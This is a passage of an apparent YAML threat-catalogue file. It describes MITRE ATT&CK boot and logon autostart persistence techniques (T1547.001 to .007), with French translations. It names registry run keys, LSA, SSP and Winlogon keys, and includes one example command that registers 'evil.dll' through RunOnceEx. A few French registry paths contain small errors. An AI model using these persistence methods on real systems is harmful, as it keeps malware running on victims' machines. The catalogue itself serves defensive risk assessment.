      automatically running a program on system boot or account logon.(Citation: Microsoft
      Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation:
      Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These
      mechanisms may include automatically executing programs that are placed in specially
      designated directories or are referenced by repositories that store configuration
      information, such as the Windows Registry. An adversary may achieve the same
      goal by modifying or extending features of the kernel.


      Since some boot or logon autostart programs run with higher privileges, an adversary
      may leverage these to elevate privileges.

      https://attack.mitre.org/techniques/T1547'
    translations:
      fr:
        name: "D\xE9marrage automatique du d\xE9marrage ou de la connexion"
        description: "Les adversaires peuvent configurer les param\xE8tres syst\xE8\
          me pour ex\xE9cuter automatiquement un programme lors du d\xE9marrage ou\
          \ de la connexion afin de maintenir la persistance ou d\u2019obtenir des\
          \ privil\xE8ges de niveau sup\xE9rieur sur les syst\xE8mes compromis. Les\
          \ syst\xE8mes d\u2019exploitation peuvent disposer de m\xE9canismes permettant\
          \ d\u2019ex\xE9cuter automatiquement un programme au d\xE9marrage du syst\xE8\
          me ou \xE0 la connexion du compte. (Citation : Microsoft Run Key)(Citation\
          \ : Paquets d\u2019authentification MSDN)(Citation : Microsoft TimeProvider)(Citation\
          \ : Cylance Reg Persistence sept. 2013)(Citation : Programmation du noyau\
          \ Linux) Ces m\xE9canismes peuvent inclure l\u2019ex\xE9cution automatique\
          \ de programmes plac\xE9s dans des r\xE9pertoires sp\xE9cialement d\xE9\
          sign\xE9s ou r\xE9f\xE9renc\xE9s par des d\xE9p\xF4ts stockant des informations\
          \ de configuration, tels que le Registre Windows. Un adversaire peut atteindre\
          \ le m\xEAme objectif en modifiant ou en \xE9tendant des caract\xE9ristiques\
          \ du noyau.\n\nPuisque certains programmes de d\xE9marrage automatique ou\
          \ de connexion fonctionnent avec des privil\xE8ges plus \xE9lev\xE9s, un\
          \ adversaire peut les exploiter pour augmenter les privil\xE8ges.\nhttps://attack.mitre.org/techniques/T1547"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.001
    ref_id: T1547.001
    name: Registry Run Keys / Startup Folder
    description: 'Adversaries may achieve persistence by adding a program to a startup
      folder or referencing it with a Registry run key. Adding an entry to the "run
      keys" in the Registry or startup folder will cause the program referenced to
      be executed when a user logs in.(Citation: Microsoft Run Key) These programs
      will be executed under the context of the user and will have the account''s
      associated permissions level.


      The following run keys are created by default on Windows systems:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>


      Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation:
      Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>
      is also available but is not created by default on Windows Vista and newer.
      Registry run key entries can reference programs directly or list them as a dependency.(Citation:
      Microsoft Run Key) For example, it is possible to load a DLL at logon using
      a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
      /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)


      Placing a program within a startup folder will also cause that program to execute
      when a user logs in. There is a startup folder location for individual user
      accounts as well as a system-wide startup folder that will be checked regardless
      of which user account logs in. The startup folder path for the current user
      is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>.
      The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start
      Menu\Programs\StartUp</code>.


      The following Registry keys can be used to set startup folder items for persistence:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>


      The following Registry keys can control automatic startup of services during
      boot:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>


      Using policy settings to specify startup programs creates corresponding values
      in either of two Registry keys:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>


      Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows
      NT\CurrentVersion\Windows</code> run automatically for the currently logged-on
      user.


      By default, the multistring <code>BootExecute</code> value of the registry key
      <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code>
      is set to <code>autocheck autochk *</code>. This value causes Windows, at startup,
      to check the file-system integrity of the hard disks if the system has been
      shut down abnormally. Adversaries can add other programs or processes to this
      registry value which will automatically launch at boot.


      Adversaries can use these configuration locations to execute malware, such as
      remote access tools, to maintain persistence through system reboots. Adversaries
      may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make
      the Registry entries look as if they are associated with legitimate programs.

      https://attack.mitre.org/techniques/T1547/001'
    translations:
      fr:
        name: "Cl\xE9s d\u2019ex\xE9cution du registre / Dossier de d\xE9marrage"
        description: "Les attaquants peuvent assurer la persistance d'un programme\
          \ en l'ajoutant dans un dossier de d\xE9marrage ou en le r\xE9f\xE9ren\xE7\
          ant via une cl\xE9 \xAB Run \xBB du Registre. L'ajout d'une entr\xE9e dans\
          \ les \xAB cl\xE9s Run \xBB du Registre ou dans le dossier de d\xE9marrage\
          \ entra\xEEnera l'ex\xE9cution du programme r\xE9f\xE9renc\xE9 lors de la\
          \ connexion d'un utilisateur. (R\xE9f\xE9rence : Cl\xE9 \xAB Run \xBB de\
          \ Microsoft) Ces programmes seront ex\xE9cut\xE9s dans le contexte de l'utilisateur\
          \ et disposeront du niveau d'autorisation associ\xE9 \xE0 ce compte.\n\n\
          Les cl\xE9s \xAB Run \xBB suivantes sont cr\xE9\xE9es par d\xE9faut sur\
          \ les syst\xE8mes Windows :\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\\
          Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\\
          Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\\
          Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\\
          Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nLes cl\xE9\
          s \xAB Run \xBB peuvent exister dans plusieurs ruches. (R\xE9f\xE9rence\
          \ : Microsoft Wow6432Node 2018) (R\xE9f\xE9rence : Malwarebytes Wow6432Node\
          \ 2016) La cl\xE9 <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\\
          CurrentVersion\\RunOnceEx</code> est \xE9galement disponible, mais elle\
          \ n'est pas cr\xE9\xE9e par d\xE9faut sous Windows Vista et les versions\
          \ ult\xE9rieures. Les entr\xE9es de cl\xE9s \xAB Run \xBB du Registre peuvent\
          \ faire r\xE9f\xE9rence directement \xE0 des programmes ou les r\xE9pertorier\
          \ en tant que d\xE9pendances. (R\xE9f\xE9rence : Cl\xE9 Run de Microsoft)\
          \ Par exemple, il est possible de charger une DLL \xE0 la connexion \xE0\
          \ l\u2019aide d\u2019une cl\xE9 \xAB \xBBDepend\xAB \xBB avec RunOnceEx\
          \ : <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\\
          0001\\Depend /v 1 /d \xAB \xBBC:\\temp\\evil[.]dll\xAB \xBB</code> (Source\
          \ : Oddvar Moe, RunOnceEx, mars 2018)\n\nPlacer un programme dans un dossier\
          \ de d\xE9marrage entra\xEEnera \xE9galement son ex\xE9cution lors de la\
          \ connexion d\u2019un utilisateur. Il existe un dossier de d\xE9marrage\
          \ pour chaque compte utilisateur, ainsi qu\u2019un dossier de d\xE9marrage\
          \ \xE0 l\u2019\xE9chelle du syst\xE8me qui sera consult\xE9 quel que soit\
          \ le compte utilisateur connect\xE9. Le chemin d\u2019acc\xE8s au dossier\
          \ de d\xE9marrage de l\u2019utilisateur actuel est <code>C:\\Users\\\\[Nom\
          \ d\u2019utilisateur]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\\
          Programs\\Startup</code>. Le chemin d\u2019acc\xE8s au dossier de d\xE9\
          marrage commun \xE0 tous les utilisateurs est <code>C:\\ProgramData\\Microsoft\\\
          Windows\\Start Menu\\Programs\\StartUp</code>.\n\nLes cl\xE9s de registre\
          \ suivantes peuvent \xEAtre utilis\xE9es pour configurer les \xE9l\xE9ments\
          \ du dossier de d\xE9marrage afin d\u2019assurer leur persistance :\n\n\
          * <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\\
          Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\\
          Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\\
          SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n\
          * <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\
          Explorer\\User Shell Folders</code>\n\nLes cl\xE9s de registre suivantes\
          \ permettent de contr\xF4ler le d\xE9marrage automatique des services au\
          \ d\xE9marrage du syst\xE8me :\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\\
          Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\\
          Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n*\
          \ <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\\
          RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\\
          CurrentVersion\\RunServices</code>\n\nL'utilisation des param\xE8tres de\
          \ strat\xE9gie pour d\xE9finir les programmes de d\xE9marrage cr\xE9e les\
          \ valeurs correspondantes dans l'une ou l'autre des deux cl\xE9s de registre\
          \ suivantes :\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\\
          CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\\
          Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\
          \nLes programmes r\xE9pertori\xE9s dans la valeur \xAB Load \xBB de la cl\xE9\
          \ de registre <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\\
          CurrentVersion\\Windows</code> s'ex\xE9cutent automatiquement pour l'utilisateur\
          \ actuellement connect\xE9.\n\nPar d\xE9faut, la valeur \xE0 cha\xEEnes\
          \ multiples <code>BootExecute</code> de la cl\xE9 de registre <code>HKEY_LOCAL_MACHINE\\\
          System\\CurrentControlSet\\Control\\Session Manager</code> est d\xE9finie\
          \ sur <code>autocheck autochk *</code>. Cette valeur oblige Windows, au\
          \ d\xE9marrage, \xE0 v\xE9rifier l\u2019int\xE9grit\xE9 du syst\xE8me de\
          \ fichiers des disques durs si le syst\xE8me a \xE9t\xE9 arr\xEAt\xE9 de\
          \ mani\xE8re anormale. Les attaquants peuvent ajouter d\u2019autres programmes\
          \ ou processus \xE0 cette valeur de registre, qui s\u2019ex\xE9cuteront\
          \ alors automatiquement au d\xE9marrage.\n\nLes attaquants peuvent utiliser\
          \ ces emplacements de configuration pour ex\xE9cuter des logiciels malveillants,\
          \ tels que des outils d\u2019acc\xE8s \xE0 distance, afin de maintenir leur\
          \ persistance malgr\xE9 les red\xE9marrages du syst\xE8me. Ils peuvent \xE9\
          galement recourir au [masquage](https://attack.mitre.org/techniques/T1036)\
          \ pour faire croire que les entr\xE9es de registre sont associ\xE9es \xE0\
          \ des programmes l\xE9gitimes.\nhttps://attack.mitre.org/techniques/T1547/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.002
    ref_id: T1547.002
    name: Authentication Package
    description: 'Adversaries may abuse authentication packages to execute DLLs when
      the system boots. Windows authentication package DLLs are loaded by the Local
      Security Authority (LSA) process at system start. They provide support for multiple
      logon processes and multiple security protocols to the operating system.(Citation:
      MSDN Authentication Packages)


      Adversaries can use the autostart mechanism provided by LSA authentication packages
      for persistence by placing a reference to a binary in the Windows Registry location
      <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of
      <code>"Authentication Packages"=&lt;target binary&gt;</code>. The binary will
      then be executed by the system when the authentication packages are loaded.

      https://attack.mitre.org/techniques/T1547/002'
    translations:
      fr:
        name: "Paquet d\u2019authentification"
        description: "Les adversaires peuvent abuser des packages d\u2019authentification\
          \ pour ex\xE9cuter des DLL au d\xE9marrage du syst\xE8me. Les DLL du paquet\
          \ d\u2019authentification Windows sont charg\xE9es par le processus de l\u2019\
          Autorit\xE9 de s\xE9curit\xE9 locale (LSA) au d\xE9marrage du syst\xE8me.\
          \ Ils assurent la prise en charge de multiples processus de connexion et\
          \ de multiples protocoles de s\xE9curit\xE9 au syst\xE8me d\u2019exploitation.\
          \ (Citation : Paquets d\u2019authentification MSDN)\n\nLes adversaires peuvent\
          \ utiliser le m\xE9canisme de d\xE9marrage automatique fourni par les packages\
          \ d\u2019authentification LSA pour la persistance en pla\xE7ant une r\xE9\
          f\xE9rence \xE0 un binaire dans l\u2019emplacement du registre Windows <code>HKLM\\\
          SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> avec la valeur cl\xE9 <code>\xAB\
          \ Authentication Packages \xBB=&lt;cible binaire&gt;</code>. Le binaire\
          \ sera ensuite ex\xE9cut\xE9 par le syst\xE8me lorsque les paquets d\u2019\
          authentification seront charg\xE9s.\nhttps://attack.mitre.org/techniques/T1547/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.003
    ref_id: T1547.003
    name: Time Providers
    description: 'Adversaries may abuse time providers to execute DLLs when the system
      boots. The Windows Time service (W32Time) enables time synchronization across
      and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers
      are responsible for retrieving time stamps from hardware/network resources and
      outputting these values to other network clients.(Citation: Microsoft TimeProvider)


      Time providers are implemented as dynamic-link libraries (DLLs) that are registered
      in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.(Citation:
      Microsoft TimeProvider) The time provider manager, directed by the service control
      manager, loads and starts time providers listed and enabled under this key at
      system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)


      Adversaries may abuse this architecture to establish persistence, specifically
      by creating a new arbitrarily named subkey  pointing to a malicious DLL in the
      `DllName` value. Administrator privileges are required for time provider registration,
      though execution will run in context of the Local Service account.(Citation:
      Github W32Time Oct 2017)

      https://attack.mitre.org/techniques/T1547/003'
    translations:
      fr:
        name: Fournisseurs de temps
        description: "Les adversaires peuvent abuser des fournisseurs de temps pour\
          \ ex\xE9cuter des DLL au d\xE9marrage du syst\xE8me. Le service Windows\
          \ Time (W32Time) permet la synchronisation temporelle entre et au sein des\
          \ domaines. (Citation : Microsoft W32Time f\xE9vr. 2018) Les fournisseurs\
          \ de temps W32Time sont responsables de r\xE9cup\xE9rer les horodatages\
          \ provenant des ressources mat\xE9rielles/r\xE9seau et de transmettre ces\
          \ valeurs \xE0 d\u2019autres clients r\xE9seau. (Citation : Microsoft TimeProvider)\n\
          \nLes fournisseurs de temps sont impl\xE9ment\xE9s comme des biblioth\xE8\
          ques \xE0 liaison dynamique (DLL) enregistr\xE9es dans les sous-cl\xE9s\
          \ de 'HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\\
          Time\\TimeProviders\\'. (Citation : Microsoft TimeProvider) Le gestionnaire\
          \ du fournisseur de temps, dirig\xE9 par le gestionnaire de contr\xF4le\
          \ du service, propose les fournisseurs d\u2019heures de chargement et de\
          \ d\xE9marrage list\xE9s et activ\xE9s sous cette cl\xE9 au d\xE9marrage\
          \ du syst\xE8me et/ou chaque fois que les param\xE8tres sont modifi\xE9\
          s. (Citation : Microsoft TimeProvider)\n\nLes adversaires peuvent abuser\
          \ de cette architecture pour \xE9tablir la persistance, notamment en cr\xE9\
          ant une nouvelle sous-cl\xE9 au nom arbitraire pointant vers une DLL malveillante\
          \ dans la valeur \xAB DllName \xBB. Les privil\xE8ges administrateur sont\
          \ n\xE9cessaires pour l\u2019enregistrement du fournisseur de temps, bien\
          \ que l\u2019ex\xE9cution se d\xE9roule dans le contexte du compte Local\
          \ Service. (Citation : Github W32Time oct. 2017)\nhttps://attack.mitre.org/techniques/T1547/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.004
    ref_id: T1547.004
    name: Winlogon Helper DLL
    description: "Adversaries may abuse features of Winlogon to execute DLLs and/or\
      \ executables when a user logs in. Winlogon.exe is a Windows component responsible\
      \ for actions at logon/logoff as well as the secure attention sequence (SAS)\
      \ triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\\
      Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and\
      \ <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>\
      \ are used to manage additional helper programs and functionalities that support\
      \ Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications\
      \ to these Registry keys may cause Winlogon to load and execute malicious DLLs\
      \ and/or executables. Specifically, the following subkeys have been known to\
      \ be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\
      \n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon\
      \ events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization\
      \ program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe,\
      \ the system shell executed when a user logs on\n\nAdversaries may take advantage\
      \ of these features to repeatedly execute malicious code and establish persistence.\n\
      https://attack.mitre.org/techniques/T1547/004"
    translations:
      fr:
        name: Winlogon Helper DLL
        description: "Les adversaires peuvent abuser des fonctionnalit\xE9s de Winlogon\
          \ pour ex\xE9cuter des DLL et/ou des ex\xE9cutables lorsqu\u2019un utilisateur\
          \ se connecte. Winlogon.exe est un composant Windows responsable des actions\
          \ lors de la connexion/d\xE9connexion ainsi que de la s\xE9quence d\u2019\
          attention s\xE9curis\xE9e (SAS) d\xE9clench\xE9e par Ctrl-Alt-Supprimer.\
          \ Les entr\xE9es du registre dans <code>HKLM\\Software[\\\\Wow6432Node\\\
          \\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> et <code>HKCU\\\
          Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> sont\
          \ utilis\xE9es pour g\xE9rer des programmes et fonctionnalit\xE9s auxiliaires\
          \ suppl\xE9mentaires supportant Winlogon. (Citation : Cylance Reg Persistence\
          \ sept. 2013) \n\nDes modifications malveillantes de ces cl\xE9s de registre\
          \ peuvent faire charger et ex\xE9cuter des DLL et/ou ex\xE9cutables malveillants\
          \ par Winlogon. Plus pr\xE9cis\xE9ment, les sous-cl\xE9s suivantes ont \xE9\
          t\xE9 connues comme \xE9tant potentiellement vuln\xE9rables \xE0 l\u2019\
          abus : (Citation : Cylance Reg Persistence sept. 2013)\n\n* Winlogon\\Notify\
          \ - pointe vers les DLL du package notification qui g\xE8rent les \xE9v\xE9\
          nements Winlogon\n* Winlogon\\Userinit - pointe vers userinit.exe, le programme\
          \ d\u2019initialisation utilisateur ex\xE9cut\xE9 lorsqu\u2019un utilisateur\
          \ se connecte\n* Winlogon\\Shell - pointe vers explorer.exe, le shell syst\xE8\
          me ex\xE9cut\xE9 lorsqu\u2019un utilisateur se connecte\n\nLes adversaires\
          \ peuvent profiter de ces fonctionnalit\xE9s pour ex\xE9cuter \xE0 plusieurs\
          \ reprises du code malveillant et \xE9tablir la persistance.\nhttps://attack.mitre.org/techniques/T1547/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.005
    ref_id: T1547.005
    name: Security Support Provider
    description: 'Adversaries may abuse security support providers (SSPs) to execute
      DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security
      Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs
      have access to encrypted and plaintext passwords that are stored in Windows,
      such as any logged-on user''s Domain password or smart card PINs.


      The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security
      Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
      Packages</code>. An adversary may modify these Registry keys to add new SSPs,
      which will be loaded the next time the system boots, or when the AddSecurityPackage
      Windows API function is called.(Citation: Graeber 2014)

      https://attack.mitre.org/techniques/T1547/005'
    translations:
      fr:
        name: "Fournisseur de support de s\xE9curit\xE9"
        description: "Les adversaires peuvent abuser des fournisseurs de support de\
          \ s\xE9curit\xE9 (SSP) pour ex\xE9cuter des DLL lors du d\xE9marrage du\
          \ syst\xE8me. Les DLL SSP de Windows sont charg\xE9es dans le processus\
          \ de l\u2019Autorit\xE9 de s\xE9curit\xE9 locale (LSA) au d\xE9marrage du\
          \ syst\xE8me. Une fois charg\xE9s dans le LSA, les DLL SSP ont acc\xE8s\
          \ \xE0 des mots de passe chiffr\xE9s et en clair stock\xE9s sous Windows,\
          \ tels que le mot de passe de domaine ou les codes PIN de carte \xE0 puce\
          \ de tout utilisateur connect\xE9.\n\nLa configuration SSP est stock\xE9\
          e dans deux cl\xE9s de registre : <code>HKLM\\SYSTEM\\CurrentControlSet\\\
          Control\\Control\\Lsa\\Security Packages</code> et <code>HKLM\\SYSTEM\\\
          CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. Un\
          \ adversaire peut modifier ces cl\xE9s de registre pour ajouter de nouveaux\
          \ SSP, qui seront charg\xE9s au prochain d\xE9marrage du syst\xE8me, ou\
          \ lorsque la fonction API Windows AddSecurityPackage sera appel\xE9e. (Citation\
          \ : Graeber 2014)\nhttps://attack.mitre.org/techniques/T1547/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.006
    ref_id: T1547.006
    name: Kernel Modules and Extensions
    description: "Adversaries may modify the kernel to automatically execute programs\
      \ on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can\
      \ be loaded and unloaded into the kernel upon demand. They extend the functionality\
      \ of the kernel without the need to reboot the system. For example, one type\
      \ of module is the device driver, which allows the kernel to access hardware\
      \ connected to the system.(Citation: Linux Kernel Programming)\_\n\nWhen used\
      \ maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014)\
      \ that run with the highest operating system privilege (Ring 0).(Citation: Linux\
      \ Kernel Module Programming Guide)\_Common features of LKM based rootkits include:\
      \ hiding itself, selective hiding of files, processes and network activity,\
      \ as well as log tampering, providing authenticated backdoors, and enabling\
      \ root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\
      \nKernel extensions, also called kext, are used in macOS to load functionality\
      \ onto a system similar to LKMs for Linux. Since the kernel is responsible for\
      \ enforcing security and the kernel extensions run as apart of the kernel, kexts\
      \ are not governed by macOS security policies. Kexts are loaded and unloaded\
      \ through <code>kextload</code> and <code>kextunload</code> commands. Kexts\
      \ need to be signed with a developer ID that is granted privileges by Apple\
      \ allowing it to sign Kernel extensions. Developers without these privileges\
      \ may still sign kexts but they will not load unless SIP is disabled. If SIP\
      \ is enabled, the kext signature is verified before being added to the AuxKC.(Citation:\
      \ System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel\
      \ extensions have been deprecated in favor of System Extensions. However, kexts\
      \ are still allowed as \"Legacy System Extensions\" since there is no System\
      \ Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension\
      \ Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003)\
      \ and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on\
      \ a system. Examples have been found in the wild, and there are some relevant\
      \ open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike\
      \ Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation:\
      \ RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension\
      \ Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)\nhttps://attack.mitre.org/techniques/T1547/006"
    translations:
      fr:
        name: Modules et extensions du noyau
        description: "Les adversaires peuvent modifier le noyau pour ex\xE9cuter automatiquement\
          \ des programmes au d\xE9marrage du syst\xE8me. Les modules de noyau chargeables\
          \ (LKM) sont des morceaux de code qui peuvent \xEAtre charg\xE9s et d\xE9\
          charg\xE9s dans le noyau \xE0 la demande. Ils \xE9tendent les fonctionnalit\xE9\
          s du noyau sans avoir besoin de red\xE9marrer le syst\xE8me. Par exemple,\
          \ un type de module est le pilote de p\xE9riph\xE9rique, qui permet au noyau\
          \ d\u2019acc\xE9der au mat\xE9riel connect\xE9 au syst\xE8me. (Citation\
          \ : Programmation du noyau Linux)\_\n\nLorsqu\u2019ils sont utilis\xE9s\
          \ de mani\xE8re malveillante, les LKM peuvent \xEAtre un type de [Rootkit](https://attack.mitre.org/techniques/T1014)\
          \ en mode noyau qui fonctionne avec le privilage le plus \xE9lev\xE9 du\
          \ syst\xE8me d\u2019exploitation (Ring 0). (Citation : Guide de programmation\
          \ des modules du noyau Linux)\_Les caract\xE9ristiques courantes des rootkits\
          \ bas\xE9s sur LKM incluent : la dissimulation de lui-m\xEAme, le masquage\
          \ s\xE9lectif des fichiers, des processus et de l\u2019activit\xE9 r\xE9\
          seau, ainsi que la falsification de journaux, la fourniture de portes d\xE9\
          rob\xE9es authentifi\xE9es et la possibilit\xE9 d\u2019un acc\xE8s root\
          \ aux utilisateurs non privil\xE9gi\xE9s. (Citation : Aper\xE7u du rootkit\
          \ iDefension)\n\nLes extensions du noyau, \xE9galement appel\xE9es kext,\
          \ sont utilis\xE9es dans macOS pour charger des fonctionnalit\xE9s sur un\
          \ syst\xE8me similaire aux LKM pour Linux. Puisque le noyau est responsable\
          \ de l\u2019application de la s\xE9curit\xE9 et que les extensions du noyau\
          \ s\u2019ex\xE9cutent comme faisant partie du noyau, les kexts ne sont pas\
          \ r\xE9gis par les politiques de s\xE9curit\xE9 de macOS. Les kexts sont\
          \ charg\xE9s et d\xE9charg\xE9s via les commandes <code>kextload</code>\
          \ et <code>kextunload</code>. Kexts doit \xEAtre sign\xE9 avec un identifiant\
          \ d\xE9veloppeur qui b\xE9n\xE9ficie de privil\xE8ges accord\xE9s par Apple\
          \ lui permettant de signer des extensions du noyau. Les d\xE9veloppeurs\
          \ sans ces privil\xE8ges peuvent toujours signer des kext, mais ils ne se\
          \ chargeront que si le SIP est d\xE9sactiv\xE9. Si SIP est activ\xE9, la\
          \ signature kext est v\xE9rifi\xE9e avant d\u2019\xEAtre ajout\xE9e \xE0\
          \ l\u2019AuxKC. (Citation : Extensions syst\xE8me et noyau dans macOS)\n\
          \nDepuis macOS Catalina 10.15, les extensions du noyau ont \xE9t\xE9 d\xE9\
          pr\xE9ci\xE9es au profit des extensions syst\xE8me. Cependant, les kexts\
          \ sont toujours autoris\xE9s en tant que \xAB extensions syst\xE8me h\xE9\
          rit\xE9es \xBB puisqu\u2019il n\u2019existe pas d\u2019extension syst\xE8\
          me pour les interfaces de programmation du noyau. (Citation : D\xE9pr\xE9\
          ciation des extensions Apple Kernel)\n\nLes adversaires peuvent utiliser\
          \ les LKM et kexts pour effectuer la [Persistance](https://attack.mitre.org/tactics/TA0003)\
          \ et/ou la [Escalade de privil\xE8ges](https://attack.mitre.org/tactics/TA0004)\
          \ sur un syst\xE8me. Des exemples ont \xE9t\xE9 trouv\xE9s dans la nature,\
          \ et il existe aussi quelques projets open source pertinents. (Citation\
          \ : Volatility Phalanx2)(Citation : Rootkit Linux CrowdStrike)(Citation\
          \ : GitHub Reptile)(Citation : Diamorphine sur GitHub)(Citation : RSAC 2015\
          \ San Francisco Patrick Wardle)(Citation : extension du noyau s\xE9curis\xE9\
          \ de Synack cass\xE9e)(Citation : Securelist Ventir)(Citation : Trend Micro\
          \ Skidmap)\nhttps://attack.mitre.org/techniques/T1547/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.007
    ref_id: T1547.007
    name: Re-opened Applications
    description: "Adversaries may modify plist files to automatically run an application\
      \ when a user logs in. When a user logs out or restarts via the macOS Graphical\
      \ User Interface (GUI), a prompt is provided to the user with a checkbox to\
      \ \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac)\
      \ When selected, all applications currently open are added to a property list\
      \ file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code>\
      \ directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle\
      \ Persistence Chapter) Applications listed in this file are automatically reopened\
      \ upon the user\u2019s next logon.\n\nAdversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003)\
      \ by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code>\
